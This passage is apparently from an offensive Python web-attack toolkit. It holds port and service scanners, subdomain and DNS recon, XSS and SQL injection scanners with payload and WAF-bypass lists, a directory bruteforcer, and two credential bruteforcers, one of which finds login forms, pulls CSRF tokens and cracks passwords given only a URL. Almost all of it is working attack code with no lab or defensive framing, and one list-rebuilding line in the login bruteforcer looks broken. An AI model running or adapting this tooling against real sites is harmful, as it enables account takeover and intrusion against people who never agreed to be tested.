        print(f"  {G}✔{N} Got {len(cc)} URLs from CommonCrawl{N}")

        all_raw = wb | cc
        print(f"\n  {C}◉{N} Total raw URLs: {len(all_raw)}")

        # Filter
        filtered = self._filter_urls(all_raw)
        print(f"  {C}◉{N} URLs with params: {len(filtered)}")

        # Extract params
        self.all_urls = sorted(filtered)
        for u in self.all_urls:
            self._extract_params(u)

        # Display
        if self.all_urls:
            print(f"\n  {G}✔{N} {BOLD}Found {len(self.params)} unique parameter(s) in {len(self.all_urls)} URL(s)!{N}")
            print(f"\n  {BOLD}{C}PARAMETERS FOUND:{N}")
            print(f"  {D}{'─'*50}{N}")
            for i, (param, urls_list) in enumerate(sorted(self.params.items()), 1):
                sample = list(urls_list)[0][:90]
                print(f"  {G}{i:>3}.{N} {Y}{param:<25}{N} {D}{len(urls_list):>4} URLs{N}")
                print(f"      {D}→ {sample}...{N}")

            # Group by endpoint
            print(f"\n  {BOLD}{C}ENDPOINTS WITH PARAMETERS:{N}")
            print(f"  {D}{'─'*50}{N}")
            endpoints = {}
            for u in self.all_urls:
                parsed = urlparse(u)
                base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if base not in endpoints:
                    endpoints[base] = set()
                for p in parse_qs(parsed.query):
                    endpoints[base].add(p)

            for i, (ep, params_set) in enumerate(sorted(endpoints.items()), 1):
                print(f"  {C}{i:>3}.{N} {ep}")
                print(f"      {D}params: {', '.join(sorted(params_set)[:8])}{N}")
                if len(params_set) > 8:
                    print(f"      {D}... and {len(params_set)-8} more{N}")

            # Save to file
            outfile = f"params_{self.domain}.txt"
            with open(outfile, "w") as f:
                for u in self.all_urls:
                    f.write(u + "\n")
            print(f"\n  {G}✔{N} Saved {len(self.all_urls)} URLs to {Y}{outfile}{N}")

            outfile2 = f"params_{self.domain}_uniq.txt"
            with open(outfile2, "w") as f:
                for p in sorted(self.params.keys()):
                    f.write(p + "\n")
            print(f"  {G}✔{N} Saved {len(self.params)} unique params to {Y}{outfile2}{N}")
        else:
            print(f"\n  {R}✘{N} No URLs with parameters found.")

        print(); return {"urls": self.all_urls, "params": self.params, "endpoints": endpoints if self.all_urls else {}}


# ══════════════════════════════════════════════════════
#  MODULES (PortScanner, ServiceDetector, XSS, SQLi, Subdomain, DNS, Whois, DirBust, LoginBf)
# ══════════════════════════════════════════════════════

class PortScanner:
    def __init__(self, target, ports="1-1024", timeout=1.0):
        self.target = target; self.timeout = timeout; self.open_ports = []; self.q = Queue()
        try: self.ip = socket.gethostbyname(target)
        except: self.ip = target
        self._parse(ports)
    def _parse(self, ports):
        self.pl = set()
        for p in ports.split(","):
            p = p.strip()
            if "-" in p: a, b = p.split("-"); self.pl.update(range(int(a),int(b)+1))
            else: self.pl.add(int(p))
        self.pl = sorted(self.pl)
    def _scan(self, p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(self.timeout)
            if s.connect_ex((self.ip, p)) == 0:
                try: sv = socket.getservbyport(p)
                except: sv = "?"
                self.open_ports.append((p, sv))
            s.close()
        except: pass
    def _worker(self):
        while not self.q.empty():
            self._scan(self.q.get()); self.q.task_done()
    def     run(self):
        header("PORT SWEEPER")
        print(f"  {C}◉{N} Target: {BOLD}{W}{self.target}{N}  |  IP: {Y}{self.ip}{N}  |  Ports: {len(self.pl)}")
        for p in self.pl: self.q.put(p)
        for _ in range(min(100, len(self.pl))): threading.Thread(target=self._worker, daemon=True).start()
        self.q.join()
        if self.open_ports:
            print(f"\n  {G}✔{N} {BOLD}{len(self.open_ports)} open port(s)!{N}")
            ptable(["PORT","STATE","SERVICE"], [[f"{p}/tcp",G+"open"+N,s] for p,s in self.open_ports])
        else: print(f"\n  {R}✘{N} No open ports.")
        print(f"  {D}{'─'*40}{N}\n"); return self.open_ports

COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,993,995,1433,1521,
                2049,2082,2083,2096,2375,2376,3306,3389,4333,4444,4848,5000,5432,5900,
                5901,5984,6000,6379,7001,7070,7777,8000,8001,8080,8081,8443,8834,9000,
                9001,9042,9092,9100,9200,9300,9418,10000,11211,27017,50070]

class QuickScanner:
    def __init__(self, target):
        self.target = target
        self.ports = COMMON_PORTS
    def run(self):
        print(f"\n  {BOLD}{C}⚡ QUICK PORT SCAN{N}  —  {Y}{self.target}{N}")
        print(f"  {D}{'─'*40}{N}")
        scanner = PortScanner(self.target, ",".join(str(p) for p in self.ports), timeout=1.0)
        return scanner.run()

class ServiceDetector:
    def __init__(self, target, ports):
        self.target = target; self.results = []
        try: self.ip = socket.gethostbyname(target)
        except: self.ip = target
        self.pl = [int(p.strip()) for p in ports.split(",") if p.strip().isdigit()]
    def _grab(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3); s.connect((self.ip, port))
            probes = {80:b"HEAD / HTTP/1.0\r\n\r\n",443:b"HEAD / HTTP/1.0\r\n\r\n",
                      21:b"\r\n",22:b"\r\n",25:b"\r\n",110:b"\r\n",143:b"\r\n",8080:b"HEAD / HTTP/1.0\r\n\r\n"}
            s.send(probes.get(port,b"\r\n")); b = s.recv(1024).decode("utf-8",errors="ignore").strip(); s.close(); return b
        except: return None
    def run(self):
        header("SERVICE FINGERPRINT")
        print(f"  {C}◉{N} Target: {BOLD}{W}{self.target}{N}")
        for port in self.pl:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
                if s.connect_ex((self.ip, port)): s.close(); continue
                try: sv = socket.getservbyport(port)
                except: sv = "unknown"
                b = self._grab(port); self.results.append({"port":port,"service":sv,"banner":b}); s.close()
            except: continue
        if self.results:
            print(f"\n  {G}✔{N} {BOLD}{len(self.results)} service(s){N}")
            ptable(["PORT","SERVICE","BANNER"], [[str(r["port"]),r["service"],(r["banner"] or D+"No banner"+N)[:50]] for r in self.results])
        else: print(f"\n  {R}✘{N} No services.")
        print(); return self.results

class XSSScanner:
    def __init__(self, url, method="GET", param=None, bypass=None):
        self.url = url; self.method = method; self.param = param
        self.bypass = bypass or BypassEngine(url); self.vulns = []
        self.payloads = ["<script>alert('XSS')</script>","<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>","<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>","<body onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>","'><script>alert('XSS')</script>",
            "javascript:alert('XSS')","<ScRiPt>alert('XSS')</ScRiPt>"]
        self.bp = ["%3Cscript%3Ealert(1)%3C/script%3E","<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<%00script>alert(1)</%00script>","<script/random=123>alert(1)</script>"]
    def _get_params(self):
        p = parse_qs(urlparse(self.url).query); return list(p.keys()) if p else []
    def _test(self, param, payload):
        try:
            new = {k: payload if k == param else v[0] for k, v in parse_qs(urlparse(self.url).query).items()}
            u = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}{urlparse(self.url).path}?{urllib.parse.urlencode(new)}"
            r = self.bypass.get(u, timeout=10) if self.method == "GET" else self.bypass.post(self.url, data={param: payload}, timeout=10)
            return (True, u) if payload.lower() in (r.text or "").lower() else (False, None)
        except requests.RequestException:
            return (False, None)
        except Exception:
            return (False, None)
    def run(self):
        header("XSS EXPLOIT CHECK")
        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"  {R}✘{N} Target unreachable — aborting.\n")
            return []
        params = self._get_params() if not self.param else [self.param]
        if not params: print(f"  {R}✘{N} No params.\n"); return []
        all_p = self.payloads + self.bp; total = len(params) * len(all_p); done = 0
        for param in params:
            for payload in all_p:
                done += 1
                if done % 10 == 0: print(f"  {D}[{done}/{total}]{N}", end="\r")
                ok, u = self._test(param, payload)
                if ok: self.vulns.append({"parameter": param, "payload": payload, "url": u or self.url})
        if self.vulns:
            print(f"\n\n  {R}{BOLD}⚠ {len(self.vulns)} XSS found!{N}")
            ptable(["#","PARAMETER","PAYLOAD"], [[str(i+1),v["parameter"],v["payload"][:38]] for i,v in enumerate(self.vulns)], colors=[R]*len(self.vulns))
        else: print(f"\n  {G}✔{N} No XSS.")
        print(); return self.vulns

class SQLiScanner:
    def __init__(self, url, method="GET", param=None, bypass=None):
        self.url = url; self.method = method; self.param = param
        self.bypass = bypass or BypassEngine(url); self.vulns = []
        self.payloads = ["'","\"","' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1",
            "1' AND '1'='1","1' AND '1'='2","' UNION SELECT NULL--","' UNION SELECT 1,2,3--",
            "admin'--","' AND SLEEP(5)--","1' AND SLEEP(5)--","' OR SLEEP(5)--",
            "' UNION SELECT @@version--","' UNION SELECT database()--","' UNION SELECT user()--"]
        self.bp = ["' OR '1'='1' --+","'/*!*/OR/*!*/'1'='1","'/**/OR/**/1=1--","'OR 1=1#","'||'1'='1",
            "%27%20OR%20%271%27%3D%271","' UN/**/ION SEL/**/ECT 1,2,3--"]
        self.patterns = ["sql","syntax error","mysql","unclosed quotation","odbc","oracle","postgresql",
            "warning: mysql","invalid query","ora-","mysql_fetch","sqlite","you have an error in your sql"]
    def _get_params(self):
        p = parse_qs(urlparse(self.url).query); return list(p.keys()) if p else []
    def _test(self, param, payload):
        try:
            new = {k: payload if k == param else v[0] for k, v in parse_qs(urlparse(self.url).query).items()}
            u = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}{urlparse(self.url).path}?{urllib.parse.urlencode(new)}"
            r = (self.bypass.get if self.method=="GET" else self.bypass.post)(u, timeout=10, allow_redirects=False) if self.method=="GET" else self.bypass.post(self.url, data={param:payload}, timeout=10, allow_redirects=False)
            t = r.text.lower()
            for p in self.patterns:
                if p in t: return (True, u, f"Error: {p}", payload)
            if r.status_code in (500, 404, 403): return (True, u, f"HTTP {r.status_code}", payload)
            return (False, None, None, None)
        except requests.RequestException:
            return (False, None, None, None)
        except Exception:
            return (False, None, None, None)
    def run(self):
        header("SQL INJECTION EXPLOIT CHECK")
        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"  {R}✘{N} Target unreachable — aborting.\n")
            return []
        params = self._get_params() if not self.param else [self.param]
        if not params: print(f"  {R}✘{N} No params.\n"); return []
        all_p = self.payloads + self.bp; total = len(params) * len(all_p); done = 0
        for param in params:
            for payload in all_p:
                done += 1
                if done % 10 == 0: print(f"  {D}[{done}/{total}]{N}", end="\r")
                ok, u, t, p = self._test(param, payload)
                if ok: self.vulns.append({"parameter": param, "payload": p, "type": t, "url": u or self.url})
        if self.vulns:
            print(f"\n\n  {R}{BOLD}⚠ {len(self.vulns)} SQLi found!{N}")
            ptable(["#","PARAMETER","TYPE","PAYLOAD"], [[str(i+1),v["parameter"],v["type"],v["payload"][:28]] for i,v in enumerate(self.vulns)], colors=[R]*len(self.vulns))
        else: print(f"\n  {G}✔{N} No SQLi.")
        print(); return self.vulns

class SubdomainEnumerator:
    def __init__(self, domain, wordlist=None, threads=20):
        self.domain = domain; self.threads = threads; self.subs = []; self.q = Queue()
        if wordlist and os.path.exists(wordlist): self.wl = wordlist
        else:
            d = os.path.join(os.path.dirname(__file__),"wordlists","subdomains.txt")
            self.wl = d if os.path.exists(d) else None
    def _check(self, sub):
        try:
            ip = socket.gethostbyname(f"{sub}.{self.domain}")
            self.subs.append((sub, f"{sub}.{self.domain}", ip))
        except: pass
    def _worker(self):
        while not self.q.empty():
            self._check(self.q.get()); self.q.task_done()
    def run(self):
        header("SUBDOMAIN ENUMERATOR")
        print(f"  {C}◉{N} Domain: {BOLD}{Y}{self.domain}{N}")
        if not self.wl:
            print(f"  {Y}⚠{N} No wordlist, using defaults")
            subs = "www mail ftp admin blog webmail dev api test vpn shop support app portal login cdn".split()
        else:
            with open(self.wl, errors="ignore") as f: subs = [l.strip() for l in f if l.strip()]
        print(f"  {C}◉{N} Checking {len(subs)} subdomains...\n")
        for s in subs: self.q.put(s)
        for _ in range(min(self.threads, len(subs))): threading.Thread(target=self._worker, daemon=True).start()
        self.q.join()
        if self.subs:
            print(f"  {G}✔{N} {BOLD}{len(self.subs)} subdomain(s)!{N}")
            ptable(["SUBDOMAIN","FULL DOMAIN","IP"], [[s,d,Y+ip+N] for s,d,ip in sorted(self.subs)])
        else: print(f"  {R}✘{N} No subdomains.")
        print(); return self.subs

class DNSRecon:
    def __init__(self, domain, record_type="ALL"):
        self.domain = domain; self.rt = record_type; self.results = {}
    def run(self):
        header("DNS RECON")
        print(f"  {C}◉{N} Domain: {Y}{self.domain}{N}")
        for r in (["A","AAAA","MX","NS"] if self.rt=="ALL" else [self.rt]):
            try:
                if r=="A": ip = socket.gethostbyname(self.domain); self.results["A (IPv4)"] = [ip]
                elif r=="AAAA":
                    try:
                        ips = [i[4][0] for i in socket.getaddrinfo(self.domain,None,socket.AF_INET6)]
                        if ips: self.results["AAAA (IPv6)"] = ips
                    except: pass
                elif r in ("MX","NS"):
                    _,_,ips = socket.gethostbyname_ex(self.domain)
                    if ips: self.results[f"{r} ({'Mail' if r=='MX' else 'Nameserver'})"] = ips
            except: continue
        if self.results:
            for k,v in self.results.items():
                print(f"  {C}▶{N} {BOLD}{k}{N}")
                for ip in v: print(f"    {D}└─{N} {Y}{ip}{N}")
        else: print(f"  {R}✘{N} No records.")
        print(); return self.results

class WhoisLookup:
    def __init__(self, domain):
        self.domain = domain
        self.servers = {"com":"whois.verisign-grs.com","net":"whois.verisign-grs.com","org":"whois.pir.org",
            "io":"whois.nic.io","co":"whois.nic.co","id":"whois.idnic.net","my":"whois.mynic.net","sg":"whois.sgnic.sg"}
    def run(self):
        header("WHOIS LOOKUP")
        tld = self.domain.split(".")[-1] if "." in self.domain else "com"
        srv = self.servers.get(tld, "whois.verisign-grs.com")
        print(f"  {C}◉{N} Domain: {Y}{self.domain}{N}  |  Server: {D}{srv}{N}\n")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(10); s.connect((srv,43))
            s.send(f"{self.domain}\r\n".encode()); data = b""
            while True:
                d = s.recv(4096)
                if not d: break
                data += d
            s.close()
            for line in data.decode("utf-8",errors="ignore").split("\n")[:60]:
                if line.strip(): print(f"  {D}│{N} {line}")
            print()
        except: print(f"  {R}✘{N} WHOIS failed.\n")

class DirBruteforcer:
    def __init__(self, url, wordlist, extensions=None, threads=10, bypass=None):
        self.base = url.rstrip("/"); self.wl = wordlist; self.threads = threads
        self.results = []; self.q = Queue()
        self.exts = extensions.split(",") if extensions else [""]
        self.bypass = bypass or BypassEngine(url)
        self.errors = 0
    def _check(self, path):
        for ext in self.exts:
            fp = path + (f".{ext}" if ext else "")
            u = urljoin(self.base+"/", fp)
            try:
                r = self.bypass.get(u, timeout=5, allow_redirects=False)
                if r.status_code in (200,201,204,301,302,307,401,403):
                    self.results.append({"url": u, "status": r.status_code, "size": len(r.content)})
                    sc = G if r.status_code==200 else (Y if r.status_code in (301,302) else M)
                    print(f"    {sc}[{r.status_code}]{N} {u}  {D}({len(r.content)}B){N}")
            except requests.RequestException:
                self.errors += 1
            except: self.errors += 1
    def _worker(self):
        while not self.q.empty():
            self._check(self.q.get()); self.q.task_done()
    def run(self):
        header("DIRECTORY ENUMERATOR")
        print(f"  {C}◉{N} URL: {Y}{self.base}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable — aborting.\n")
            return []
        try:
            with open(self.wl, errors="ignore") as f: paths = [l.strip() for l in f if l.strip()]
        except: print(f"  {R}✘{N} Wordlist not found.\n"); return []
        print(f"  {C}◉{N} Paths: {len(paths)} | Threads: {self.threads}\n")
        for p in paths: self.q.put(p)
        for _ in range(min(self.threads, len(paths))): threading.Thread(target=self._worker, daemon=True).start()
        self.q.join()
        if self.results: print(f"\n  {G}✔{N} {BOLD}{len(self.results)} path(s)!{N}")
        else: print(f"\n  {R}✘{N} No paths.")
        if self.errors:
            print(f"  {D}({self.errors} request(s) failed){N}")
        print(); return self.results

class LoginBruteforcer:
    def __init__(self, url, usernames_file, passwords_file,
                 user_f="username", pass_f="password",
                 fail_s="incorrect", method="POST",
                 threads=1, delay=0, mode="form",
                 csrf_token=None, csrf_field=None,
                 proxy=None, bypass=None):
        self.url = url
        self.uf = usernames_file
        self.pf = passwords_file
        self.ufield = user_f
        self.pfield = pass_f
        self.fail = fail_s
        self.method = method.upper()
        self.threads = min(threads, 50)
        self.delay = delay
        self.mode = mode
        self.csrf_token = csrf_token
        self.csrf_field = csrf_field or "csrf_token"
        self.proxy = proxy
        self.creds = []
        self.lock = threading.Lock()
        self.done = 0
        self.total = 0
        self.start_time = None
        self.bypass = bypass or BypassEngine(url)
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def _extract_csrf(self, html):
        patterns = [
            r'name=["\']csrf[_]?token["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']_csrf["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']_token["\'][^>]*value=["\']([^"\']+)',
            r'csrf-token["\']?\s*content=["\']([^"\']+)',
            r'<input[^>]*name=["\']csrf["\'][^>]*value=["\']([^"\']+)',
        ]
        for pat in patterns:
            m = re.search(pat, html, re.I)
            if m:
                return m.group(1)
        return None

    def _try(self, u, p):
        try:
            data = {}
            if self.mode == "json":
                data = {self.ufield: u, self.pfield: p}
                if self.csrf_token:
                    data[self.csrf_field] = self.csrf_token
                r = self.session.post(self.url, json=data, timeout=10, allow_redirects=False)
            elif self.mode == "basic":
                r = self.session.get(self.url, auth=(u, p), timeout=10, allow_redirects=False)
            elif self.mode == "bearer":
                headers = {"Authorization": f"Bearer {p}"}
                r = self.session.get(self.url, headers=headers, timeout=10, allow_redirects=False)
            else:
                csrf = self.csrf_token
                if not csrf and self.method == "POST":
                    try:
                        gr = self.session.get(self.url, timeout=8)
                        csrf = self._extract_csrf(gr.text)
                    except: pass
                data[self.ufield] = u
                data[self.pfield] = p
                if csrf:
                    data[self.csrf_field] = csrf

                if self.method == "POST":
                    r = self.session.post(self.url, data=data, timeout=10, allow_redirects=False)
                else:
                    r = self.session.get(self.url, params=data, timeout=10, allow_redirects=False)

            # Multi-method success detection
            if self.fail and self.fail.lower() not in r.text.lower():
                return True
            if r.status_code in (302, 307, 308) and "login" not in r.headers.get("Location", "").lower():
                return True
            if r.status_code == 200 and self.fail and self.fail.lower() not in r.text.lower():
                return True
            return False
        except: return False

    def _worker(self, q):
        while True:
            try:
                u, p = q.get_nowait()
            except:
                break
            if self._try(u, p):
                with self.lock:
                    self.creds.append({"username": u, "password": p})
                    print(f"\n  {G}{BOLD}[SUCCESS]{N} {Y}{u}{N} : {Y}{p}{N}")
            with self.lock:
                self.done += 1
                if self.done % max(1, self.total // 100) == 0 or self.done == self.total:
                    elapsed = time.time() - self.start_time
                    rate = self.done / elapsed if elapsed > 0 else 0
                    eta = (self.total - self.done) / rate if rate > 0 else 0
                    pct = self.done * 100 // self.total
                    print(f"  {D}[{self.done}/{self.total}] {pct}% | {rate:.1f}/s | ETA {eta:.0f}s{N}", end="\r")
            if self.delay > 0:
                time.sleep(self.delay)
            q.task_done()

    def run(self):
        header("LOGIN BRUTEFORCER")
        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
        print(f"  {C}◉{N} Mode: {Y}{self.mode.upper()}{N} | Method: {Y}{self.method}{N} | Threads: {Y}{self.threads}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.proxy:
            print(f"  {C}◉{N} Proxy: {Y}{self.proxy}{N}")

        try:
            with open(self.uf, errors="ignore") as f: users = [l.strip() for l in f if l.strip()]
        except: print(f"  {R}✘{N} Users file not found.\n"); return []
        try:
            with open(self.pf, errors="ignore") as f: passes = [l.strip() for l in f if l.strip()]
        except: print(f"  {R}✘{N} Pass file not found.\n"); return []

        self.total = len(users) * len(passes)
        print(f"  {C}◉{N} Users: {len(users)} | Passwords: {len(passes)} | Combos: {Y}{self.total}{N}")

        if self.mode != "form" or self.method != "POST":
            passes = [p for u in users for p in passes]
            users = [u for u in users for p in passes]

        if self.total == 0:
            print(f"  {R}✘{N} Empty combos.\n"); return []

        q = Queue()
        for u in users:
            for p in passes:
                q.put((u, p))

        self.start_time = time.time()
        print(f"  {D}{'─'*50}{N}")

        for _ in range(min(self.threads, self.total)):
            t = threading.Thread(target=self._worker, args=(q,), daemon=True)
            t.start()
        q.join()

        elapsed = time.time() - self.start_time
        print(f"\n  {D}{'─'*50}{N}")
        if self.creds:
            print(f"  {R}{BOLD}⚠ {len(self.creds)} valid credential(s) found in {elapsed:.1f}s!{N}")
            ptable(["USERNAME", "PASSWORD"], [[c["username"], c["password"]] for c in self.creds], colors=[G] * len(self.creds))
        else:
            print(f"  {R}✘{N} No valid credentials found  ({elapsed:.1f}s, {self.total} attempts).")
        print()
        return self.creds


# ══════════════════════════════════════════════════════
#  AUTO BRUTEFORCER — URL-Only Login Bruteforce
# ══════════════════════════════════════════════════════

class AutoBruteforcer:
    def __init__(self, url, threads=5, delay=0, proxy=None):
        self.url = url.rstrip("/")
        self.threads = min(threads, 20)
        self.delay = delay
        self.proxy = proxy
        self.bypass = BypassEngine(url)
        self.form_action = None
        self.form_method = "POST"
        self.username_field = "username"
        self.password_field = "password"
        self.csrf_field = None
        self.csrf_token = None
        self.ajax_mode = False
        self.baseline = None  # Stores fail response signature
        self.creds = []
        self.lock = threading.Lock()
        self.found = threading.Event()
        self.total = 0
        self.done = 0
        self.start_time = None

    def _detect_form(self):
        """Extract login form fields + AJAX endpoint from cached page HTML."""
        html = getattr(self.bypass, 'waf_raw', None)
        if not html:
            try:
                r = requests.get(self.url, timeout=15, verify=False)
                html = r.text
            except Exception as e:
                return f"Failed to fetch page: {e}"

        # 1) Scan JavaScript for AJAX login endpoints ($.post / fetch)
        ajax_match = re.search(r"""\$\.post\s*\(\s*_BASE_URL\s*\+\s*['"]([^'"]+)['"]""", html, re.I)
        if not ajax_match:
            ajax_match = re.search(r"""\$\.post\s*\(\s*['"]([^'"]+)['"]""", html, re.I)
        if not ajax_match:
            ajax_match = re.search(r"""fetch\(['"]([^'"]*login[^'"]*)['"]""", html, re.I)
        if ajax_match:
            endpoint = ajax_match.group(1)
            self.form_action = urljoin(self.url, endpoint) if not endpoint.startswith("http") else endpoint
            self.form_method = "POST"
            self.ajax_mode = True

        # 2) Find input fields (name attributes) from the form
        pw_match = re.search(r'''<input[^>]+type=["']password["'][^>]+name=["']([^"']+)["']''', html, re.I)
        if pw_match:
            self.password_field = pw_match.group(1)

        un_match = re.search(r'''<input[^>]+type=["']text["'][^>]+name=["']([^"']+)["']''', html, re.I)
        if un_match:
            self.username_field = un_match.group(1)

        # 3) CSRF from meta tag
        ms = re.search(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)', html, re.I)
        if ms:
            self.csrf_field = "csrf_token"
            self.csrf_token = ms.group(1)

        # 4) Fallback: parse <form> tags
        if not self.form_action or not self.password_field:
            forms = []
            i = 0
            while True:
                fs = html.find("<form", i)
                if fs == -1: break
                fe = html.find("</form>", fs)
                if fe == -1: break
                forms.append(html[fs:fe+7])
                i = fe + 7
            for form in forms:
                inputs = re.findall(r'<input[^>]+>', form, re.I)
                for inp in inputs:
                    t = (re.search(r'type=["\']([^"\']+)["\']', inp, re.I) or [None, ""]).group(1).lower()
                    nm = (re.search(r'name=["\']([^"\']+)["\']', inp, re.I) or [None, ""]).group(1)
                    if t == "password":
                        self.password_field = nm
                    elif t in ("text", "email"):
                        if any(k in nm.lower() for k in ["user", "email", "login", "name"]):
                            self.username_field = nm
                    elif t == "hidden":
                        if any(k in nm.lower() for k in ["csrf", "token", "nonce", "_token"]):
                            self.csrf_field = nm
                            vm = re.search(r'value=["\']([^"\']+)["\']', inp, re.I)
                            if vm: self.csrf_token = vm.group(1)
                if self.password_field:
                    am = re.search(r'action=["\']([^"\']+)["\']', form[:300], re.I)
                    if am:
                        a = am.group(1)
                        self.form_action = urljoin(self.url, a) if not a.startswith("http") else a
                    if not self.form_action:
                        self.form_action = self.url
                    mm = re.search(r'method=["\']([^"\']+)["\']', form[:200], re.I)
                    if mm: self.form_method = mm.group(1).upper()
                    break

        if not self.password_field:
            return "No password field found"
        if not self.form_action:
            self.form_action = self.url
        return None  # Success

    def _build_baseline(self):
        """Send guaranteed-wrong login to capture fail signature (with retries)."""
        fake_u = f"__nusatool_invalid_{random.randint(10000,99999)}__"
        fake_p = f"__nusatool_wrong_{random.randint(10000,99999)}__"
        data = {self.username_field: fake_u, self.password_field: fake_p}
        if self.csrf_field and self.csrf_token:
            data[self.csrf_field] = self.csrf_token
        for attempt in range(3):
            try:
                headers = {}
                if getattr(self, 'ajax_mode', False):
                    headers['X-Requested-With'] = 'XMLHttpRequest'
                    headers['Accept'] = 'application/json, text/javascript, */*; q=0.01'
                if self.form_method == "GET":
                    r = self.bypass.get(self.form_action, params=data, headers=headers, timeout=20, allow_redirects=False)
                else:
                    r = self.bypass.post(self.form_action, data=data, headers=headers, timeout=20, allow_redirects=False)
                self.baseline = {
                    "status": r.status_code,
                    "len": len(r.text),
                    "text": r.text,
                    "text_hash": hashlib.md5(r.text.encode()).hexdigest(),
                    "redirect": r.headers.get("Location", ""),
                    "cookies": dict(r.cookies),
                }
                return True
            except requests.Timeout:
                if attempt < 2:
                    print(f"  {Y}⚠{N} Baseline timeout (attempt {attempt+1}), retrying...")
                    time.sleep(2)
                else:
                    print(f"  {R}✘{N} Baseline request timeout after 3 attempts")
            except Exception as e:
                if attempt < 2:
                    time.sleep(1)
                else:
                    print(f"  {R}✘{N} Baseline request failed: {e}")
        return False

    def _try(self, u, p):
        data = {self.username_field: u, self.password_field: p}
        if self.csrf_field and self.csrf_token:
            data[self.csrf_field] = self.csrf_token
        try:
            headers = {}
            if getattr(self, 'ajax_mode', False):
                headers['X-Requested-With'] = 'XMLHttpRequest'
                headers['Accept'] = 'application/json, text/javascript, */*; q=0.01'
            if self.form_method == "GET":
                r = self.bypass.get(self.form_action, params=data, headers=headers, timeout=15, allow_redirects=False)
            else:
                r = self.bypass.post(self.form_action, data=data, headers=headers, timeout=15, allow_redirects=False)

            if self.baseline is None:
                return False

            bl = self.baseline
            loc = r.headers.get("Location", "")
            text = r.text
            html_lower = text.lower()

            # 1) JSON response — parse and check for success status
            if text.strip().startswith('{'):
                try:
                    j = json.loads(text)
                    if j.get('status') == 'success':
                        return True
                except (json.JSONDecodeError, AttributeError):
                    pass
                # All JSON non-success responses are definitely failures
                return False

            # 2) Redirect ke non-login page → strong success
            if r.status_code in (301, 302, 307, 308):
                if loc and "login" not in loc.lower() and loc != bl.get("redirect", ""):
                    return True

            # 3) Ga ada password field di response → kemungkinan udah login
            if "type=\"" in html_lower:
                has_pw = bool(re.search(r'type\s*=\s*["\']password["\']', html_lower, re.I))
                if not has_pw:
                    no_login = "login" not in html_lower and "sign in" not in html_lower
                    if no_login or abs(len(r.text) - bl.get("len", 0)) > 500:
                        return True

            # 4) HTML success keywords
            success_kw = ["welcome", "dashboard", "logout", "my account",
                          "selamat datang", "berhasil", "profil"]
            fail_kw = ["invalid", "wrong password", "incorrect", "login failed",
                       "failed", "tidak valid", "salah", "gagal"]
            has_success = any(k in html_lower for k in success_kw)
            has_fail = any(k in html_lower for k in fail_kw)
            if has_success and not has_fail:
                return True

            # 5) Size berubah drastis + hash beda → possible success
            if abs(len(r.text) - bl.get("len", 0)) > 1000:
                text_hash = hashlib.md5(text.encode()).hexdigest()
                if text_hash != bl.get("text_hash", ""):
                    if not has_fail:
                        return True

            return False
        except:
            return False

    def _worker(self, q):
        while not self.found.is_set():
            try:
                u, p = q.get_nowait()
            except:
                break
            if self._try(u, p):
                with self.lock:
                    self.creds.append({"username": u, "password": p})
                    self.found.set()
                    elapsed = time.time() - self.start_time
                    print(f"\n  {G}{BOLD}[SUCCESS]{N} {Y}{u}{N} : {Y}{p}{N}  {D}({elapsed:.1f}s){N}")
            with self.lock:
                self.done += 1
                now = time.time()
                if self.done % max(1, self.total // 50) == 0 or self.done == self.total:
                    elapsed = now - self.start_time
                    rate = self.done / elapsed if elapsed > 0 else 0
                    pct = self.done * 100 // self.total
                    eta = (self.total - self.done) / rate if rate > 0 else 0
                    print(f"  {D}[{self.done}/{self.total}] {pct}% | {rate:.1f}/s | ETA {eta:.0f}s{N}", end="\r")
            if self.delay > 0:
                time.sleep(self.delay)
            q.task_done()

    def run(self):
        header("AUTO BRUTEFORCER — URL-ONLY LOGIN CRACK")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n")
            return []

        # Phase 1: Form detection
        print(f"\n  {BOLD}{C}PHASE 1: FORM DETECTION{N}")
        err = self._detect_form()
        if err:
            print(f"  {R}✘{N} {err}\n")
            return []
        print(f"  {G}✔{N} Login form detected!")
        print(f"      {D}URL:   {Y}{self.form_action}{N}")
        print(f"      {D}Field: {Y}{self.username_field}{N} / {Y}{self.password_field}{N}")
        print(f"      {D}CSRF:  {Y}{self.csrf_field or 'none'}{N}")
        if self.csrf_token:
            print(f"      {D}Token: {Y}{self.csrf_token[:30]}...{N}")

        # Phase 1b: Baseline
        print(f"\n  {BOLD}{C}PHASE 1b: BUILD FAIL BASELINE{N}")
        print(f"  {C}▶{N} Sending deliberately wrong login to capture fail signature...")
        if not self._build_baseline():
            print(f"  {R}✘{N} Could not build baseline — aborting.\n")
            return []
